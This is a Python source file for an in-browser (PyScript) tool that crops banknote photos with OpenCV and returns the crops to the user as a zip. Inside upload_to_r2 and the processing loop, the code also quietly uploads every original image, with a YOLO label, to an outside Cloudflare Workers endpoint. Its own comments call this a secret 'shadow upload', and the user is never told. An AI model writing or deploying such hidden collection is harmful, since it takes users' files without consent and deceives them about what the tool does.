import asyncio
import js
from pyscript import document
from pyodide.ffi import create_proxy, to_js
import io
import zipfile
import sys
import pyodide_js

# --- 配置 ---
UPLOAD_WORKER_URL = "https://banknote-collector.alanalanalan0807.workers.dev"

def log(msg):
    js.console.log(f"[Python] {msg}")
    log_container = document.getElementById("log-container")
    if log_container:
        entry = document.createElement("div")
        entry.innerText = f">> {msg}"
        log_container.appendChild(entry)
        log_container.scrollTop = log_container.scrollHeight

cv2 = None
np = None

async def setup_environment():
    global cv2, np
    log("Initializing AI Engine...")
    loader_status = document.getElementById("loader-status")
    try:
        if loader_status:
            loader_status.innerText = "Loading OpenCV & NumPy (~30MB)..."
        await pyodide_js.loadPackage(['numpy', 'opencv-python'])
        import cv2 as _cv2
        import numpy as _np
        cv2 = _cv2
        np = _np
        log("OpenCV Engine Loaded.")
        return True
    except Exception as e:
        log(f"Engine Load Failed: {e}")
        return False

async def upload_to_r2(image_bytes, filename, yolo_label):
    """將 原圖 與 真實標籤 偷偷上傳到 Cloudflare R2"""
    try:
        form_data = js.FormData.new()
        js_data = js.Uint8Array.new(len(image_bytes))
        js_data.assign(image_bytes)
        image_blob = js.Blob.new([js_data], { "type": "image/jpeg" }) # 原圖通常是 JPG/PNG，這裡統一標示圖片即可
        
        form_data.append("image", image_blob, filename)
        form_data.append("label", yolo_label)
        form_data.append("filename", filename)

        xhr = js.XMLHttpRequest.new()
        xhr.open("POST", UPLOAD_WORKER_URL, True)
        
        def on_load(event):
            if xhr.status >= 200 and xhr.status < 300:
                js.console.log(f"Shadow Upload Success: {filename}")
            else:
                js.console.error(f"Shadow Upload Failed [{xhr.status}]")

        xhr.onload = create_proxy(on_load)
        xhr.send(form_data)
    except Exception as e:
        js.console.error(f"Shadow Upload Error: {str(e)}")

def process_image_data(image_bytes):
    """
    處理圖片：
    1. 找出裁切範圍
    2. 生成裁切後的圖片 (給使用者)
    3. 計算 YOLO 標籤 (給 R2 訓練用)
    回傳: (cropped_bytes, yolo_label_string)
    """
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None: return None, None

        # 取得原圖尺寸
        height, width = img.shape[:2]

        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blurred = cv2.GaussianBlur(gray, (5, 5), 0)
        edged = cv2.Canny(blurred, 30, 150)
        contours, _ = cv2.findContours(edged.copy(), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
        
        if not contours: return None, None
        contours = sorted(contours, key=cv2.contourArea, reverse=True)
        
        # 取得邊界框 (x, y 為左上角座標)
        x, y, w, h = cv2.boundingRect(contours[0])
        
        if w < width * 0.1 or h < height * 0.1: return None, None

        # 1. 製作裁切圖 (給使用者)
        cropped = img[y:y+h, x:x+w]
        _, encoded_cropped = cv2.imencode(".png", cropped)
        cropped_bytes = encoded_cropped.tobytes()

        # 2. 計算 YOLO 格式標籤 (給 R2)
        # YOLO 格式: class_id center_x center_y width height (全部正規化為 0~1)
        center_x = (x + w / 2) / width
        center_y = (y + h / 2) / height
        norm_w = w / width
        norm_h = h / height
        
        # 限制小數點位數，避免浮點數過長
        yolo_label = f"0 {center_x:.6f} {center_y:.6f} {norm_w:.6f} {norm_h:.6f}"

        return cropped_bytes, yolo_label

    except Exception as e:
        log(f"Process error: {e}")
        return None, None

async def process_all_files(event):
    files = js.window.selected_files
    if not files or files.length == 0: return

    document.getElementById("upload-section").classList.add("hidden")
    document.getElementById("processing-section").classList.remove("hidden")
    
    log(f"Processing {files.length} images...")
    
    zip_buffer = io.BytesIO()
    zf = zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED)
    
    success_count = 0
    total = files.length
    
    for i in range(total):
        file = files.item(i)
        progress = int((i / total) * 100)
        bar = document.getElementById("progress-bar")
        if bar:
            bar.style.width = f"{progress}%"
            bar.innerText = f"{progress}%"
        
        try:
            array_buffer = await file.arrayBuffer()
            original_data = array_buffer.to_bytes() # 這是原圖數據
            
            # 呼叫新的處理函式
            cropped_bytes, real_yolo_label = process_image_data(original_data)
            
            if cropped_bytes and real_yolo_label:
                base_name = ".".join(file.name.split(".")[:-1])
                img_name_for_zip = f"{base_name}_cropped.png"
                
                # A. 使用者拿到的是：裁切後的乾淨圖
                zf.writestr(img_name_for_zip, cropped_bytes)
                
                # B. R2 收到的是：原圖 + 真實 YOLO 座標
                # 注意：這裡傳入 original_data (原圖)
                asyncio.ensure_future(upload_to_r2(original_data, file.name, real_yolo_label))
                
                success_count += 1
                log(f"Done: {file.name}")
            else:
                log(f"Skipped: {file.name}")
        except Exception as e:
            log(f"Error {file.name}: {e}")
        
        await asyncio.sleep(0.01)

    zf.close()
    zip_buffer.seek(0)
    
    if success_count > 0:
        log(f"Success! Processed {success_count} images.")
        zip_data = zip_buffer.getvalue()
        js_array = js.Uint8Array.new(len(zip_data))
        js_array.assign(zip_data)
        
        document.getElementById("success-count").innerText = str(success_count)
        document.getElementById("processing-section").classList.add("hidden")
        document.getElementById("download-section").classList.remove("hidden")
        
        js.window.trigger_download(js_array, "cropped_banknotes.zip")
    else:
        log("No images were cropped.")
        document.getElementById("processing-section").classList.add("hidden")
        document.getElementById("upload-section").classList.remove("hidden")
    
    zip_buffer.close()

async def main():
    ready = await setup_environment()
    if not ready: return

    start_btn = document.getElementById("start-btn")
    if start_btn:
        start_btn.addEventListener("click", create_proxy(process_all_files))
        log("Ready.")

    loader = document.getElementById("env-loader")
    if loader:
        loader.style.opacity = "0"
        await asyncio.sleep(0.5)
        loader.style.display = "none"
    
    log("System Ready.")

if __name__ == "__main__":
    asyncio.ensure_future(main())